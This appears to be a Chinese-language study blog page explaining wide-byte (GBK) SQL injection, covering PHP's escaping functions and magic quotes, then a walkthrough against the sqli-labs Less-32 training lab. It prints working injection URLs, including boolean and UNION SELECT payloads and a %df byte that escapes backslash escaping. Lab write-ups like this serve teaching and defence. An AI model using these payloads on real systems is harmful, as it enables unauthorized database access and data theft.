@@ -1,0 +1,50 @@
+<h1 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h1><p>宽字节注入是由于<strong>不同编码</strong>中中英文所占字符的的不同所导致的，通常的来说，在GBK编码当中，一个<strong>汉字占用2个字节</strong>。除了UTF-8以外，所有的ANSI编码中文都是<strong>占用俩个字符</strong>。</p>
+<pre><code class="language-bash">//GBK和其他所有ANSI结果为2
+echo strlen(&quot;中&quot;) 
+
+//UTF-8
+echo strlen(&quot;中&quot;) //结果为3
+</code></pre>
+<p>我们先说一下php中对于sql注入的过滤，这里就不得不提到几个函数了。</p>
+<p>​<code>addslashes()</code>​函数，这个函数在<code>预定义字符</code>​之前添加反斜杠 \ 。 这个函数有一个特点<u>虽然会添加反斜杠 \ 进行转义，但是 \ 并不会插入到数据库中。</u>这个函数的功能和<code>魔术引号</code>​完全相同，所以当打开了魔术引号时，不应使用这个函数。可以使用<code>get_magic_quotes_gpc()</code>​来检测是否已经转义。</p>
+<p>​<code>mysql_real_escape_string()</code>​函数，这个函数用来转义sql语句中的特殊符号<code>x00</code>​、<code>\n</code>​、<code>\r</code>​、<code>\</code>​、<code>&#39;</code>​、<code>&quot;</code>​、<code>x1a</code>​。</p>
+<p><strong>注：</strong></p>
+<ol>
+<li><p>​<code>预定义字符</code>​：单引 ‘，双引 “，反斜 \，NULL</p>
+</li>
+<li><p>​<code>魔术引号</code>​：当打开时，所有单引号 ‘、双引号 “ 、反斜杠 \ 和NULL字符都会被自动加上一个反斜线来进行转义，和addslashes()函数的作用完全相同。所以，如果魔术引号打开，就不要使用addslashes()函数。一共有三个魔术引号指令：</p>
+<ol>
+<li>magic_quotes_gpc</li>
+<li>magic_quotes_runtime</li>
+<li>magic_quotes_sybase</li>
+</ol>
+</li>
+</ol>
+<p>实操：此次采用sqli的Less-32</p>
+<pre><code>//正常显示
+http://192.168.209.128:88/Less-32/?id=1 -- qwq
+</code></pre>
+<p>开始注入：</p>
+<pre><code>//添加引号
+http://192.168.209.128:88/Less-32/?id=1&#39; -- qwq
+</code></pre>
+<p><img src="/assets/image-20250519100543-zrvavbk.png" alt="image"></p>
+<pre><code class="language-bash">//布尔注入
+http://192.168.209.128:88/Less-32/?id=1&#39; and 1=2 -- qwq
+</code></pre>
+<p><img src="/assets/image-20250519100551-mtp6jbq.png" alt="image"></p>
+<pre><code class="language-bash">//unionunion注入
+http://192.168.209.128:88/Less-32/?id=1&#39; union select 1,version(),database() -- qwq
+</code></pre>
+<p><img src="/assets/image-20250519100602-u01p2cc.png" alt="image"></p>
+<p>发现页面回显信息，每次注入都将\进行了转义，这时候就要把<code>\</code>​去掉，</p>
+<p>宽字节注入，这里利用的是MySQL的一个特性。MySQL在使用GBK编码的时候，会认为<code>2</code>​个字符是<code>1</code>​个汉字，前提是前一个字符的ASCII值大于128，才会认为是汉字。所以只要我们输入的数据<code>大于等于 %81</code>​就可以使 ‘ 逃脱出来了。</p>
+<p>开始注入：</p>
+<pre><code>http://192.168.1.132:86/Less-32/?id=1 %df 
+</code></pre>
+<p><img src="/assets/image-20250519100805-3ysuh9x.png" alt="image"></p>
+<p>可以发现%df和 ‘ 组成了一个汉字 把<code>/</code>​号干掉之后就可以用unionunion注入查询数据了。</p>
+<pre><code>http://192.168.209.128:88/Less-32/?id=-1�&#39; union select 1,2,3 -- qwq
+</code></pre>
+<p><img src="/assets/image-20250519101246-7n48yti.png" alt="image"></p>
+<p>注入成功！</p>
